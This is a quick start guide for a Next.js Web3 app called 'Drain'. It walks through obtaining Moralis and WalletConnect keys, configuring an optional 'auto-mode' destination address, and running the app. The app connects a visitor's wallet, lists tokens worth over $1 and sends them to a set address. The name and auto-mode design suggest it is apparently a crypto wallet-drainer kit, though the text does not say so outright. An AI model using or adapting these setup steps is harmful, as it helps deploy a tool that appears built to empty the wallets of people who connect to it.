# Quick Start Guide

A step-by-step guide to get Drain running in your project.

## Prerequisites

- Node.js 18+ installed
- npm or yarn package manager
- A Web3 wallet (MetaMask recommended)

## Step 1: Get API Keys

### Moralis API Key

1. Go to [https://admin.moralis.io/](https://admin.moralis.io/)
2. Sign up or log in
3. Navigate to "Web3 APIs" → "API Keys"
4. Copy your API key

### WalletConnect Project ID

1. Go to [https://cloud.walletconnect.com/](https://cloud.walletconnect.com/)
2. Sign up or log in
3. Create a new project
4. Copy your Project ID

## Step 2: Install Dependencies

```bash
npm install
```

This installs:
- Next.js, React, TypeScript
- Wagmi, Viem, RainbowKit (Web3)
- Jotai (state management)
- Geist UI (components)
- Zod (validation)

## Step 3: Configure Environment

Create `.env.local` in the project root:

```bash
# Required
MORALIS_API_KEY=your_moralis_api_key_here
NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID=your_walletconnect_project_id

# Optional (for auto-mode)
NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS=0xYourDestinationAddress
```

## Step 4: Run Development Server

```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000)

## Step 5: Test the Application

1. Click "Connect Wallet" in the top right
2. Select your wallet (MetaMask, WalletConnect, etc.)
3. Approve the connection
4. Your tokens should appear automatically
5. Enter a destination address or use auto-mode
6. Select tokens and click "Send"

## Troubleshooting

### "No tokens showing"
- Check your Moralis API key is correct
- Verify you're on a supported chain (Ethereum, Polygon, BSC, etc.)
- Check browser console for errors
- Ensure tokens are worth > $1 USD (filtering threshold)

### "Wallet connection fails"
- Verify WalletConnect Project ID is set
- Check browser console for errors
- Try a different wallet

### "Auto-mode not working"
- Verify `NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS` is set
- Restart the dev server after setting env variable
- Check browser console for auto-mode logs

### "Transaction fails"
- Ensure wallet has enough native token for gas (ETH, BNB, etc.)
- Verify destination address is valid
- Check token balance is sufficient

## Next Steps

- Read [TECHNICAL_DOCUMENTATION.md](./TECHNICAL_DOCUMENTATION.md) for detailed implementation
- Customize token filtering thresholds in `src/moralis-client.ts`
- Add more chains in `pages/_app.tsx`
- Customize UI components in `components/contract/`

## Support

For issues or questions:
- Check the [Technical Documentation](./TECHNICAL_DOCUMENTATION.md)
- Review the code comments
- Check browser console for error messages
